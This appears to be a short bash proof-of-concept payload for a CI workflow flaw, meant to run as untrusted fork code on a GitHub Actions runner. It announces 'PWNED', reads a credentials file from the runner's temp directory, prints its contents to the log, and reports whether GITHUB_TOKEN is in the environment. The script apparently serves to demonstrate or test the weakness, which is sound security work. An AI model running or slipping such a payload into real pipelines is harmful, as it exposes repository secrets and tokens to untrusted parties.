#!/usr/bin/env bash
set -euo pipefail
echo "=================================================="
echo "PWNED: untrusted fork code executed on the runner"
echo "=================================================="
CREDS="${RUNNER_TEMP:-/tmp}/creds.txt"
[ -f "$CREDS" ] && echo "secret is readable by fork code -> $(cat "$CREDS")"
echo "GITHUB_TOKEN present in env: $([ -n "${GITHUB_TOKEN:-}" ] && echo yes || echo no)"
